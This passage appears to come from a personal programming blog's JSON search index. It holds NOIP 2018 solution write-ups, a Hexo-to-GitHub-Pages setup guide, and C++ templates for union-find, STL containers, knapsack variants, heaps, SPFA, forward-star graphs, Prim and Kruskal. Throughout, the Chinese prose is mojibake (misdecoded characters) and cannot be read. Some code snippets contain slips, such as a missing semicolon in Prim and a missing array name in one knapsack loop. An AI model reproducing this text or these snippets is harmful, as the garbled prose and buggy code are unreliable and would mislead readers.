++i) { int v = G[u][i]; if (!vis[v]) { dfs(v, u); } } } void solve() { for (int i = 1; i &lt;= n; ++i) { sort(G[i].begin(), G[i].end()); } dfs(1, 0); for (int i = 1; i &lt;= n; ++i) { printf(&quot;%d &quot;, ans[i]); } }}/* 1050ms 11964kB with O2 */ $II.$ $m = n$å­˜åœ¨ä¸€ä¸ªç¯ï¼ˆåŸºç¯æ ‘ï¼‰æ‰‹ç®—ä¸€ä¸‹æ ·ä¾‹2å¯ä»¥å‘ç°ï¼Œæœ‰ä¸”ä»…æœ‰ä¸€æ¡è¾¹ä¸ä¼šé€šè¿‡é€ä¸ªåˆ è¾¹å°è¯•å³å¯ï¼Œåˆ è¾¹åå’Œ$m = n - 1$ç›¸åŒæ ·ä¾‹2å›¾ç¤ºï¼š ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 5050;const int inf = 0x3f3f3f3f;inline int read() { int x = 0, f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}int n, m, ans[maxn], in[maxn][2];vector&lt;int&gt; G[maxn];namespace SolveOne { int cnt = 0; bool vis[maxn]; void dfs(int u, int fa) { ans[++cnt] = u; vis[u] = true; for (int i = 0; i &lt; G[u].size(); ++i) { int v = G[u][i]; if (!vis[v]) { dfs(v, u); } } } void solve() { for (int i = 1; i &lt;= n; ++i) { sort(G[i].begin(), G[i].end()); } dfs(1, 0); for (int i = 1; i &lt;= n; ++i) { printf(&quot;%d &quot;, ans[i]); } }}namespace SolveTwo { int cnt = 0, res[maxn], du, dv; bool vis[maxn]; bool notdel(int u, int v) { //åˆ¤æ–­è¯¥è¾¹æ˜¯å¦è¢«åˆ  if ((u == du &amp;&amp; v == dv) || (u == dv &amp;&amp; v == du)) { return false; } return true; } void dfs(int u, int fa) { res[++cnt] = u; vis[u] = true; for (int i = 0; i &lt; G[u].size(); ++i) { int v = G[u][i]; if (!vis[v] &amp;&amp; notdel(u, v)) { dfs(v, u); } } } bool judge() { //åˆ¤æ–­æ˜¯å¦ä¸ºæ›´ä¼˜æƒ…å†µ for (int i = 1; i &lt;= n; ++i) { if (ans[i] != res[i]) { return ans[i] &gt; res[i]; } } return false; } void solve() { memset(ans, 0x3f, sizeof(ans)); for (int i = 1; i &lt;= n; ++i) { sort(G[i].begin(), G[i].end()); } for (int i = 1; i &lt;= m; ++i) { cnt = 0; memset(res, 0, sizeof(res)); memset(vis, 0, sizeof(vis)); du = in[i][0]; //åˆ è¾¹ dv = in[i][1]; dfs(1, 0); if (judge() &amp;&amp; cnt == n) { //å¦‚æœæ›´ä¼˜åˆ™æ›´æ”¹ans[] memcpy(ans, res, sizeof(res)); } } for (int i = 1; i &lt;= n; ++i) { printf(&quot;%d &quot;, ans[i]); } }}int main() { n = read(); m = read(); for (int i = 1; i &lt;= m; ++i) { int u = read(), v = read(); G[u].push_back(v); G[v].push_back(u); in[i][0] = u; //å­˜å‚¨è¾“å…¥ä¿¡æ¯ in[i][1] = v; } if (m == n - 1) { SolveOne::solve(); } else { SolveTwo::solve(); } return 0;}/* 2244ms 1276kB */ $D2T2$ å¡«æ•°æ¸¸æˆæš´åŠ›æ¨æŸ¿å­é¦–å…ˆæ˜ç¡®ä¸€ä¸ªæ¦‚å¿µ:æœ¬æ–‡çš„å¯¹è§’çº¿æŒ‡çš„æ˜¯ä»å·¦ä¸‹æ–¹åˆ°å³ä¸Šæ–¹çš„æœ‰å‘çº¿æ®µ$\\mathcal{Lemma}\\ I.$ å¯¹è§’çº¿ä¸Šçš„æ•°åªä¼šç›¸åŒæˆ–é€’å‡$proof:$ç”±ä¸Šå›¾ä¸¤æ¡é»‘çº¿å’Œé¢˜ç›®æè¿°å³å¯è¯æ˜$Q.E.D$ $\\mathcal{Lemma}\\ II.$ è‹¥$(x-1, y)$ä¸$(x, y-1)$çš„æ•°ç›¸åŒ,åˆ™ä»¥$(x,y)$ä¸ºå·¦ä¸Šè§’,æ•´ä¸ªå›¾å½¢å³ä¸‹è§’çš„å­çŸ©é˜µçš„æ¯æ¡å¯¹è§’çº¿(è“)ä¸Šå¡«çš„æ•°å­—ç›¸åŒ$proof:$ç”±å›¾ä¸Šä¸¤æ¡æ©™çº¿åŠé¢˜ç›®æè¿°å³å¯è¯æ˜$Q.E.D$ $\\mathcal{Lemma}\\ III.$ $Ans(n,m)=Ans(m,n)$ æ­£å¼æ¨å¼å­(é»˜è®¤$n \\leq m$) $I.$ $n = 1$ æ—¶æ¯ä¸ªæ ¼å†…éƒ½æœ‰2ç§å¡«æ³•,æ•…$\\Ans(1,m)=2^{m}$ $II.$ $n = 2$ æ—¶ä¸¤ä¸ªè§’ä¸Šå„ä¸¤ç§,å‰©ä½™$m-1$æ¡å¯¹è§’çº¿æ¯æ¡æœ‰3ç§(11,10,00)æ•…$Ans(2,m)=2\\times 2\\times 3^{m-1}=4\\times 3^{m-1}$ $III. $ $n \\geq 4$ æ—¶ (åªè€ƒè™‘$n = m$æ—¶)$case I.$ å·¦ä¸Šè§’ä¸¤æ•°ç›¸åŒå›¾ä¸­æ•°å­—è¡¨ç¤ºæ¯æ¡å¯¹è§’çº¿æ–¹æ¡ˆæ•°å¯ä»¥å¾—å‡º$Ans(caseI.)=2\\times 2\\times 4^{n-2}\\times 2^{n-1}=8^{n-1}$ $case II.$ ç¬¬ä¸‰æ¡å¯¹è§’çº¿æ•°å­—ç›¸åŒå›¾ä¸­çº¢è‰²æ•°å­—è¡¨ç¤ºæ–¹æ¡ˆæ•°å¯ä»¥å¾—å‡º$Ans(caseII.)=2\\times 2\\times 5\\times 4^{n-4}\\times 2^{n-1}=5\\times 2^{3n-7}$ $case III.$ ç¬¬ä¸‰æ¡å¯¹è§’çº¿ä¸Šæ•°å­—ä¸åŒå¯ä»¥å‘ç°å·¦ä¾§ä¸¤è¡Œåªèƒ½å¡«01,æ‰€ä»¥å¯èƒ½ä¼šå†æ¬¡å‡ºç°å¯¹è§’æ•°å­—ç›¸åŒçš„æƒ…å†µ ç¬¬ä¸€ä¸ªå‡ºç° æœ€åä¸€ä¸ªå‡ºç° å€’æ•°ç¬¬äºŒä¸ªå‡ºç° æ²¡æœ‰å‡ºç° æ³¨æ„ç¬¬ä¸‰æ¡å¯¹è§’çº¿å¯èƒ½æœ‰100,110ä¸¤ç§æƒ…å†µæ‰€ä»¥$Ans(case III.)=2\\times (2\\times 4\\times 5\\times 2^{n-1}\\times \\sum_{i=0}^{n-5}{4^i} + 2\\times 4\\times 3\\times 2^{n-2} + 2\\times 3\\times 2^{n-2})$ $Ans(n, n)=Ans(case I.) + Ans(case II.) + Ans(case III.)$$$Ans(n,n)=\\frac{83\\times 8^n + 5\\times 2^{n+7}}{384}$$ $IV.$ $n = 3$è¯æ˜ä¸å‰ç±»ä¼¼$$Ans(3,m)=112\\times 3^{m-3}$$ $V.$ $n \\neq m$ æ—¶ä¸å‰ç±»ä¼¼$$Ans(n,n+1)=\\frac{83\\times 8^n + 2^{n+8}}{128}$$åŒæ—¶æ˜“è¯å¾—$Ans(n,m+1)=3\\times Ans(n,m)$ äºæ˜¯å°±è§£å†³äº† ä»£ç 123456789101112131415161718192021222324252627282930#include &lt;bits/stdc++.h&gt;#define mod 1000000007using namespace std;typedef long long LL;int n, m;LL poww(LL a, LL b) { LL res = 1; for ( ; b; a = a * a % mod, b &gt;&gt;= 1){ if (b &amp; 1) { res = res * a % mod; } } return res;}int main() { scanf(&quot;%d %d&quot;, &amp;n, &amp;m); if (n &gt; m) swap(n, m); if (n == 1) printf(&quot;%lld\\n&quot;, poww(2, m)); else if (n == 2) printf(&quot;%lld\\n&quot;, 4 * poww(3, m - 1) % mod); else if (n == 3) printf(&quot;%lld\\n&quot;, 112 * poww(3, m - 3) % mod); else { if (m == n) printf(&quot;%lld\\n&quot;, ((83 * poww(8, n) % mod + 5 * poww(2, n + 7) % mod) * 190104168 % mod)); else printf(&quot;%lld\\n&quot;, ((83 * poww(8, n) % mod + poww(2, n + 8)) * poww(3, m - n - 1) % mod * 570312504 % mod )); } return 0;}/* 55ms 1048kB */ $D2T3$ ä¿å«ç‹å›½åŠ¨æ€DP,æ ‘å‰–,è’Ÿè’»ä¸ä¼š é€ƒ å¦‚æœ‰ç–‘é—®,å¯ä»¥åœ¨ä¸‹æ–¹è¯„è®ºåŒºç•™è¨€","link":"/p/34a76f7d.html"},{"title":"Hexoæ­å»ºåšå®¢","text":"ç”±äºmkdocsä¸Šæœ‰å¾ˆå¤šä¸è¶³ï¼Œä¾‹å¦‚æ²¡æœ‰æ ‡ç­¾ï¼Œåˆ†ç±»ï¼Œè¯„è®ºï¼Œè®¡æ•°ç­‰ç­‰ï¼Œæ•…è½¬è‡³ä½¿ç”¨Hexoæ­å»ºåšå®¢ï¼Œä»¥ä¸‹æ˜¯æˆ‘æŠ˜è…¾çš„è¿‡ç¨‹ å®‰è£…Hexoæˆ‘æ˜¯ç”¨çš„æ˜¯Ubuntu16.04ç³»ç»Ÿï¼Œå…¶ä»–ç³»ç»Ÿå®‰è£…æ–¹æ³•å¯åˆ°å®˜ç½‘æŸ¥è¯¢åœ¨nodejså®˜ç½‘ä¸‹è½½node.jsï¼Œå¹¶è§£å‹æ·»åŠ ç¯å¢ƒå˜é‡echo &quot;export PATH=$PATH:/home/tony/node-v8.11.4-linux-x64/bin&quot; &gt;&gt; ~/.zshrcï¼ˆå¦‚æœä½¿ç”¨çš„æ˜¯bashï¼Œå°†æœ€åä¸€å¥æ”¹ä¸º~/.bashrcï¼‰source ~/.zshrcåº”ç”¨æ›´æ”¹ ä¸‹è½½hexonpm install -g hexo-cli æ­å»ºåšå®¢123$ mkdir blog$ cd blog$ hexo init ä½¿ç”¨hexo så¯åŠ¨æœåŠ¡,åœ¨æµè§ˆå™¨ä¸­è¾“å…¥localhost:4000ä¾¿å¯çœ‹åˆ°é¢„è§ˆç½‘é¡µ éƒ¨ç½²åˆ°GitPagesåˆ›å»º&lt;username&gt;.github.ioå­˜å‚¨åº“æ›´æ”¹_config.ymlæ–‡ä»¶ä¸­è¿™ä¸€éƒ¨åˆ† 1234deploy: type: git repository: git@github.com:&lt;username&gt;/&lt;username&gt;.github.io.git branch: master ä½¿ç”¨hexo d -gå‘å¸ƒ ä¸»é¢˜æˆ‘å½“å‰ä½¿ç”¨çš„æ˜¯maupassantä¸»é¢˜è¯¦ç»†é…ç½®è§å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ å‚è€ƒHexoå®˜ç½‘zzqæµ…è°ˆç”¨Hexo+GitHubæ­å»ºè‡ªå·±çš„blogHexoåšå®¢æ­å»ºè¯´æ˜ä¹¦ï¼ˆæŒ‡åŒ—ä¹¦ï¼‰ä»é›¶æ­å»º Hexo + Github åšå®¢","link":"/p/178c0d2c.html"},{"title":"æ›´æ–°æ—¥å¿—","text":"æœ¬åšå®¢åœ¨2019.3.10æ›´æ”¹è‡³ç”±Hexoé©±åŠ¨ï¼Œå¹¶åœ¨2019.3.12å®Œæˆæ›´æ”¹ã€‚åŸæ–‡ç« æ—¶é—´å‡æ”¹ä¸º2019.1.9ï¼Œç®—æ³•æ¨¡æ¿æ—¶é—´æ”¹ä¸º2019.1.10ã€‚","link":"/p/5a717bf0.html"},{"title":"Cppç®—æ³•-å¹¶æŸ¥é›†","text":"è¯´æ˜n, m, qç‚¹æ•°ã€è¾¹æ•°ã€é—®é¢˜æ•°x, yéœ€è¦åˆå¹¶çš„ä¸¤ä¸ªæ•°ufs[]å¹¶æŸ¥é›†find(int)æŸ¥æ‰¾å¹¶æŸ¥é›†ä¸­ä¸€ä¸ªæ•°çš„ç¥–å…ˆunionn(int, int)åˆå¹¶ä¸¤ä¸ªæ•°æ‰€åœ¨é›†åˆ å®ç°1234567891011121314151617181920212223242526272829303132333435363738const int maxn = 10010;int ufs[maxn];int n, m, x, y, q;int find(int x){ if (ufs[x] != x) return ufs[x] = find(ufs[x]); return ufs[x] = x;}void unionn(int x, int y){ int fx = find(x); int fy = find(y); if (fx != fy) { ufs[fx] = fy; }}int main(){ scanf(&quot;%d %d&quot;, &amp;n, &amp;m); for (int i = 1; i &lt;= n; ++i) ufs[i] = i; for (int i = 1; i &lt;= m; ++i) { scanf(&quot;%d %d&quot;, &amp;x, &amp;y); unionn(x, y); } scanf(&quot;%d&quot;, &amp;q); for (int i = 1; i &lt;= q; ++i) { scanf(&quot;%d %d&quot;, &amp;x, &amp;y); if (find(x) == find(y)) printf(&quot;YES\\n&quot;); else printf(&quot;NO\\n&quot;); } return 0;}","link":"/p/9603fc0b.html"},{"title":"Cppç®—æ³•-STLæ ‡å‡†åº“","text":"æ¨¡æ¿ 1234template &lt;typename T&gt;/** * å†™å‡½æ•°/ç»“æ„ä½“ */ ä¾‹12345678910111213141516171819template &lt;typename T&gt;struct Point{ T x, y; Point(T x = 0, T y = 0):x(x), y(y) {}};template &lt;typename T&gt;Point&lt;T&gt; operator + (const Point&lt;T&gt;&amp; A, const Point&lt;T&gt;&amp; B){ return Point&lt;T&gt;(A.x + B.x, A.y + B.y);}template &lt;typename T&gt;ostream&amp; operator &lt;&lt; (ostream&amp; out, const Point&lt;T&gt;&amp; p){ out &lt;&lt; &quot;(&quot; &lt;&lt; p.x &lt;&lt; &quot;,&quot; &lt;&lt; p.y &lt;&lt; &quot;)&quot;; return out;} vector(ä¸å®šé•¿æ•°ç»„) å£°æ˜vector&lt;æ•°æ®ç±»å‹&gt; å; ä¾‹ vector&lt;int&gt; a; ç®€å•ç”¨æ³•a.size();è¯»å–å¤§å°a.resize();æ”¹å˜å¤§å°a.push_back(x);å°¾éƒ¨æ·»åŠ å…ƒç´ xa.pop_back();åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´ a.clear();æ¸…ç©ºa.empty()è¯¢é—®æ˜¯å¦ä¸ºç©º(boolç±»å‹)a[]è®¿é—®å…ƒç´ (å¯ä¿®æ”¹) priority_queue(ä¼˜å…ˆé˜Ÿåˆ—/å †) å£°æ˜å¤´æ–‡ä»¶: #include &lt;queue&gt;å‚æ•°: priority_queue&lt;Type, Container, Functional&gt;&emsp;Typeæ•°æ®ç±»å‹ ä¸å¯çœ&emsp;Containerå®¹å™¨(vector,deque)é»˜è®¤vector&emsp;Functionalæ¯”è¾ƒæ–¹å¼,é»˜è®¤operator &lt;å¤§æ ¹å † ä½¿ç”¨ä¸queueç±»ä¼¼ å°æ ¹å †priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt; &gt; q;ä½¿ç”¨ä»¿å‡½æ•°greater&lt;&gt; è‡ªå®šä¹‰ç±»å‹(struct)12345struct Node{ int x, y; Node(int a = 0, int b = 0):x(a), y(b){}}; é‡è½½operator &lt;1234567bool operator &lt; (Node a, Node b){ if (a.x == b.x) return a.y &gt; b.y; return a.x &gt; b.x;}priority_queue&lt;Node&gt; q; xå€¼å¤§çš„ä¼˜å…ˆçº§ä½,æ’åœ¨é˜Ÿå‰xç›¸ç­‰,yå¤§çš„ä¼˜å…ˆçº§ä½ é‡å†™ä»¿å‡½æ•°12345678910struct cmp{ bool operator () (Node a, Node b) { if (a.x == b.x) return a.y &gt; b.y; return a.x &gt; b.x; }}priority_queue&lt;Node, vector&lt;Node&gt;, cmp&gt; q;","link":"/p/ac108281.html"},{"title":"Cppç®—æ³•-èƒŒåŒ…é—®é¢˜","text":"01èƒŒåŒ…é—®é¢˜æœ‰ $n$ ä»¶ç‰©å“ï¼Œå’Œä¸€å®¹ç§¯ä¸º $V$ çš„èƒŒåŒ…ï¼Œç¬¬ $i$ ä»¶ç‰©å“çš„ä½“ç§¯ä¸º $w_i$ ï¼Œä»·å€¼ä¸º $c_i$ ã€‚å°†ç¬¬å‡ ä»¶ç‰©å“è£…å…¥ï¼Œä½¿ä½“ç§¯ä¸è¶…è¿‡æ€»ä½“ç§¯ï¼Œä¸”ä»·å€¼å’Œæœ€å¤§ï¼Œæ±‚æœ€å¤§ä»·å€¼ã€‚ ç”±é¢˜æ„æ˜“çŸ¥çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š $F_{i,j} = max(F_{i-1,j}\\ , F_{i-1,j-w_i} + c_i)$ $F_{i, j}$ ä¸ºå‰ $i$ ä»¶ç‰©å“æ”¾å…¥å®¹é‡ä¸º $V$ çš„èƒŒåŒ…ä¸­æœ€å¤§ä»·å€¼æ—¶é—´å¤æ‚åº¦ $O(n\\times V)$ ï¼Œç©ºé—´å¤æ‚åº¦ $O(n\\times V)$ æ¡†æ¶æ³¨æ„å€’åºï¼Œä¿è¯f[n][V]ä¸ºç»“æœ 12345678for (int i = 1; i &lt;= n; ++i){ for (int j = V; j &gt;= w[i]; --j) { f[i][j] = max(f[i - 1][j], f[i - 1][j - w[i]] + c[i]); }}printf(&quot;%d&quot;, f[n][V]) ç©ºé—´å¤æ‚åº¦ä¼˜åŒ–é™è‡³ä¸€ç»´æ•°ç»„æ—¶é—´å¤æ‚åº¦ $O(n\\times V)$ ï¼Œç©ºé—´å¤æ‚åº¦ $O(V)$ 12345678for (int i = 1; i &lt;= n; ++i){ for (int j = V; j &gt;= w[i]; --j) { f[j] = max(f[j], f[j - w[i]] + c[i]); }}printf(&quot;%d&quot;, f[V]); å®Œå…¨èƒŒåŒ…é—®é¢˜æœ‰ $n$ ç§ç‰©å“ï¼ˆæ¯ç§ æ— é™ä»¶ ï¼‰ï¼Œå’Œä¸€å®¹ç§¯ä¸º $V$ çš„èƒŒåŒ…ï¼Œç¬¬ $i$ ç§ç‰©å“çš„ä½“ç§¯ä¸º $w_i$ ï¼Œä»·å€¼ä¸º $c_i$ ã€‚å°†ç¬¬å‡ ç§ç‰©å“å–ä»»æ„ä»¶è£…å…¥ï¼Œä½¿ä½“ç§¯ä¸è¶…è¿‡æ€»ä½“ç§¯ï¼Œä¸”ä»·å€¼å’Œæœ€å¤§ï¼Œæ±‚æœ€å¤§ä»·å€¼ã€‚ å°†01èƒŒåŒ…ç¬¬äºŒä¸ªå¾ªç¯æ”¹ä¸ºæ­£åºå³å¯çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š$F_j = max(F_j\\ , F_{j-w_i}+c_i)$ æ¡†æ¶12345678for (int i = 1; i &lt;= n; ++i){ for (int j = w[i]; j &lt;= V; ++j) { f[j] = max(f[j], f[j - w[i]] + c[i]); }}printf(&quot;%d&quot;, f[V]); å¤šé‡èƒŒåŒ…é—®é¢˜æœ‰ $N$ ç§ç‰©å“ï¼Œå’Œä¸€å®¹ç§¯ä¸º $V$ çš„èƒŒåŒ…ï¼Œç¬¬ $i$ ç§ç‰©å“æœ‰ $n_i$ ä»¶ï¼Œä½“ç§¯ä¸º $w_i$ ï¼Œä»·å€¼ä¸º $c_i$ ã€‚å°†ç¬¬å‡ ä»¶ç‰©å“è£…å…¥ï¼Œä½¿ä½“ç§¯ä¸è¶…è¿‡æ€»ä½“ç§¯ï¼Œä¸”ä»·å€¼å’Œæœ€å¤§ï¼Œæ±‚æœ€å¤§ä»·å€¼ã€‚ è§£æ³• $I.$ åŒ–ä¸ºå®Œå…¨èƒŒåŒ…çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š$F_{i,v} = max(F_{i-1,v-k\\times w_i} + k\\times c_i | 0\\leqslant k\\leqslant n_i)$æ—¶é—´å¤æ‚åº¦ï¼š$O(V\\times \\sum{n_i})$ æ¡†æ¶1234567891011for (int i = 1; i &lt;= N; ++i){ for (int j = V; j &gt;= 0; --j) { for (int k = 0; k &lt;= n[i]; ++k) { f[i][j] = max(f[i - 1][j], [i - 1][j - k * w[i]] + k * c[i]) } }}printf(&quot;%d&quot;, f[N][V]); è§£æ³• $II.$ åŒ–ä¸º01èƒŒåŒ…æŠŠ $n_i$ ä»¶ä¸€ç§ç‰©å“åŒ–ä¸ºå•ç‹¬çš„ $n_i$ ä»¶ç‰©å“å³å¯æ—¶é—´å¤æ‚åº¦ï¼š$O(V\\times \\sum{n_i})$æ¡†æ¶ç•¥ è§£æ³• $III.$ äºŒè¿›åˆ¶ä¼˜åŒ–$$n_i\\to 1+2+4+\\dots +2^{k-1}+\\dots +(n_i-2^k+1)$$$$\\sum{n_i}\\to \\sum{\\log_2{n_i}}$$æ—¶é—´å¤æ‚åº¦ï¼š$O(V\\times \\sum{\\log_2{n_i}})$ æ¡†æ¶123456789101112131415161718for (int i = 1; i &lt;= n; ++i){ int w, c, n, t = 1; scanf(&quot;%d %d %d&quot;, &amp;w, &amp;c, &amp;n); while(n &gt;= t) { v[++N] = x * t; w[N] = y * t; n -= t; t *= 2; } v[++N] = x * n; w[N] = y * n;}for (int i = 1; i &lt;= N; ++i) for (int j = V; j &gt;= v[i]; --j) f[j] = max(f[j], f[j - v[i]] + w[i]);printf(&quot;%d&quot;, f[V]); æ··åˆä¸‰ç§èƒŒåŒ…é—®é¢˜æœ‰ $N$ ç§ç‰©å“ï¼Œå’Œä¸€å®¹ç§¯ä¸º $V$ çš„èƒŒåŒ…ï¼Œç¬¬ $i$ ç§ç‰©å“æœ‰ $n_i$ ä»¶æˆ–æ— ç©·ä»¶ï¼Œä½“ç§¯ä¸º $w_i$ ï¼Œä»·å€¼ä¸º $c_i$ ã€‚å°†ç¬¬å‡ ä»¶ç‰©å“è£…å…¥ï¼Œä½¿ä½“ç§¯ä¸è¶…è¿‡æ€»ä½“ç§¯ï¼Œä¸”ä»·å€¼å’Œæœ€å¤§ï¼Œæ±‚æœ€å¤§ä»·å€¼ã€‚ ä¼ªæ¡†æ¶12345678910111213for (int i = 1; i &lt;= N; ++i){ if (ç¬¬iä»¶æ˜¯æœ‰ç©·ä»¶) { for (int j = V; j &gt;= 0; --j) f[j] = max(f[j], f[j - w[i]] + c[i]); } else //æœ‰æ— ç©·ä»¶ { for (int j = 0; j &lt;= V; ++j) f[j] = max(f[j], f[j - w[i]] + c[i]); }} äºŒç»´è´¹ç”¨çš„èƒŒåŒ…é—®é¢˜æœ‰ $N$ ä»¶ç‰©å“ï¼Œå®¹ç§¯ä¸º $V,U$ çš„ä¸¤ä¸ªèƒŒåŒ…ï¼Œæ¯ä»¶ç‰©å“æœ‰ä¸¤ç§è´¹ç”¨ï¼Œé€‰æ‹©ç‰©å“éœ€è¦ä»˜å‡ºä¸¤ç§ä»£ä»·ï¼Œç¬¬ $i$ ä»¶ä»£ä»·ä¸º $a_i,b_i$ï¼Œä»·å€¼ä¸º $c_i$ã€‚å°†ç¬¬å‡ ä»¶ç‰©å“è£…å…¥ï¼Œä½¿ä½“ç§¯ä¸è¶…è¿‡æ€»ä½“ç§¯ï¼Œä¸”ä»·å€¼å’Œæœ€å¤§ï¼Œæ±‚æœ€å¤§ä»·å€¼ã€‚ æ”¹ä¸ºäºŒç»´æ•°ç»„å³å¯çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š$F_{v,u} = max(F_{v,u}\\ , F_{v-a_i,u-b_i} + c_i)$$F_{v,u}$ è¡¨ç¤ºå‰é¢çš„ç‰©å“ä»˜å‡ºä»£ä»·åˆ†åˆ«ä¸º $v,u$ æ—¶çš„æœ€å¤§ä»·å€¼æ¡†æ¶ç•¥ å¾ªç¯é¡ºåº ç±»01èƒŒåŒ…ï¼šv = V..0 u = U..0 ç±»å®Œå…¨èƒŒåŒ…ï¼šv = 0..V u = 0..U ç±»å¤šé‡èƒŒåŒ…ï¼šæ‹†åˆ†ç‰©å“ åˆ†ç»„çš„èƒŒåŒ…é—®é¢˜æœ‰ $K$ ç»„ç‰©å“ï¼Œ $V$ çš„èƒŒåŒ…ï¼Œç¬¬ $k$ ç»„æœ‰ $N_k$ ä»¶ç‰©å“ï¼Œç¬¬ $i$ ä»¶ç‰©å“çš„ä½“ç§¯ä¸º $w_i$ ï¼Œä»·å€¼ä¸º $c_i$ ï¼Œæ¯ç»„ä¸­åªèƒ½é€‰ä¸€ä»¶ç‰©å“ã€‚å°†ç¬¬å‡ ä»¶ç‰©å“è£…å…¥ï¼Œä½¿ä½“ç§¯ä¸è¶…è¿‡æ€»ä½“ç§¯ï¼Œä¸”ä»·å€¼å’Œæœ€å¤§ï¼Œæ±‚æœ€å¤§ä»·å€¼ã€‚ æ¡†æ¶12345678for (int k = 1; k &lt;= K; ++k){ for (int v = V; v &gt;= 0; --v) { for (int i = 1; i &lt;= N[k]; ++i) f[v] = max(f[v], f[v - w[i]] + c[i]); }} èƒŒåŒ…é—®é¢˜çš„æ–¹æ¡ˆæ•°çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š$F_{i,v} = sum(F_{i-1,v}, F_{i-1,v-w_i})\\ \\ \\ (F_{0,0} = 1)$ æ¡†æ¶1234567f[0] = 1;for (int i = 1; i &lt;= N; ++i){ for (int j = w[i]; j &lt;= V; ++j) f[j] += f[j - w[i]];}printf(&quot;%d&quot;, f[V]);","link":"/p/990bbe9a.html"},{"title":"Cppç®—æ³•-å †","text":"è¯´æ˜heap[]å †heap_sizeå †å¤§å°put(int)å‹å…¥ä¸€ä¸ªæ•°get()å¼¹å‡ºå †é¡¶ æ™®é€šå®ç°12345678910111213141516171819202122232425262728293031323334int heap[maxn];int heap_size = 0;void put(int d){ int now, next; heap[++heap_size] = d; now = heap_size; while (now &gt; 1) { next = now &gt;&gt; 1; if (heap[now] &lt;= heap[next]) break; swap(heap[now], heap[next]); now = next; } return;}int get(){ int now, next, res; res = heap[1]; heap[1] = heap[heap_size--]; now = 1; while (now * 2 &lt;= heap_size) { next = now * 2; if (next &lt; heap_size &amp;&amp; heap[next + 1] &lt; heap[next]) next++; if (heap[now] &lt;= heap[next]) break; swap(heap[now], heap[next]); now = next; } return res;} STLå®ç°1234567891011121314151617int heap[maxn];int heap_size = 0;void put(int d){ heap[++heap_size] = d; push_heap(heap + 1, heap + heap_size + 1); //push_heap(heap + 1, heap + heap_size + 1, greater&lt;int&gt;()); return;}int get(){ pop_heap(heap + 1, heap + heap_size + 1); //pop_heap(heap + 1, heap + heap_size + 1, greater&lt;int&gt;()); return heap[heap_size--];}","link":"/p/bb233fbc.html"},{"title":"Cppç®—æ³•-å›¾è®º-SPFA","text":"è¯´æ˜n, m, sç‚¹æ•°ã€è¾¹æ•°ã€æºç‚¹cnt, head[], edge[], add(int, int, int)é“¾å¼å‰å‘æ˜Ÿdist[]å„ç‚¹åˆ°æºç‚¹è·¯å¾„é•¿vis[]è®°å½• å®ç°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647const int maxn = 10010;const int maxm = 500010;int n, m, s, dist[maxn], vis[maxn];int cnt, head[maxn];struct Edge{ int next, to, dis;}edge[maxm];void add(int from, int to, int dis){ edge[++cnt].next = head[from]; edge[cnt].to = to; edge[cnt].dis = dis; head[from] = cnt;}void SPFA(){ queue&lt;int&gt; q; for (int i = 1; i &lt;= n; ++i) { dist[i] = INT_MAX; } q.push(s); dist[s] = 0; vis[s] = true; while (!q.empty()) { int u = q.front(); q.pop(); vis[u] = 0; for (int i = head[u]; i; i = edge[i].next) { int v = edge[i].to; if (dist[v] &gt; dist[u] + edge[i].dis) { dist[v] = dist[u] + edge[i].dis; if (!vis[v]) { vis[v] = true; q.push(v); } } } } return;}","link":"/p/8ed8c69a.html"},{"title":"Cppç®—æ³•-å›¾è®º-é“¾å¼å‰å‘æ˜Ÿ","text":"è¯´æ˜cntè®°æ•°head[]è®°å½•è¾¹çš„å¤´struct Edge{int, int, int}è¾¹ä¿¡æ¯: å¼€å§‹ç‚¹ã€ç»“æŸç‚¹ã€æƒå€¼add_edge(int, int, int)æ·»åŠ è¾¹ å®ç°123456789101112int cnt, head[maxn];struct Edge{ int next, to, val;}edge[maxm];void add_edge(int from, int to, int val){ edge[++cnt].next = head[from]; edge[cnt].to = to; edge[cnt].val = val; head[from] = cnt;}","link":"/p/dda660a4.html"},{"title":"Cppç®—æ³•-å›¾è®º-Prim","text":"è¯´æ˜n, m, _map[][]ç‚¹æ•°ã€è¾¹æ•°ã€é‚»æ¥çŸ©é˜µdist[]æ ‘æ ¹åˆ°å„ç‚¹è·¯å¾„é•¿pre[]ç”Ÿæˆæ ‘è·¯å¾„ å®ç°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657const int maxn = 101;int n, m, dist[maxn], _map[maxn][maxn], pre[maxn];void make(){ scanf(&quot;%d %d&quot;, &amp;n, &amp;m); for (int i = 1; i &lt;= n; ++i) for (int j = 1; j &lt;= n; ++j) _map[i][j] = INT_MAX; for (int i = 1; i &lt;= n; ++i) _map[i][i] = 0; for (int i = 1; i &lt;= m; ++i) { int from, to, w; scanf(&quot;%d %d %d&quot;, &amp;from, &amp;to, &amp;w); _map[from][to] = w; } return;}void Prim(){ int i, j, k; int min; bool p[maxn]; for (int i = 2; i &lt;= n; ++i) { p[i] = false; dist[i] = _map[1][i]; pre[i] = 1; } dist[1] = 0; p[1] = true; for (int i = 1; i &lt;= n - 1; ++i) { min = INT_MAX; k = 0; for (int j = 1; j &lt;= n; ++j) { if (!p[j] &amp;&amp; dist[j] &lt; min) { min = dist[j] k = j; } } if (k == 0) return; p[k] = true; for (int j = 1; j &lt;= n; ++j) { if (!p[j] &amp;&amp; _map[k][j] != INT_MAX &amp;&amp; dist[j] &gt; _map[k][j]) { dist[j] = _map[k][j]; pre[j] = k; } } } return;}","link":"/p/8760af74.html"},{"title":"Cppç®—æ³•-å›¾è®º-Kruskal","text":"è¯´æ˜ufs[], find(int), unionn(int, int)å¹¶æŸ¥é›†ç»“æ„edge[]é“¾å¼å‰å‘æ˜Ÿcmp(Edge, Edge)è¾¹æ’åºæ–¹æ¡ˆ 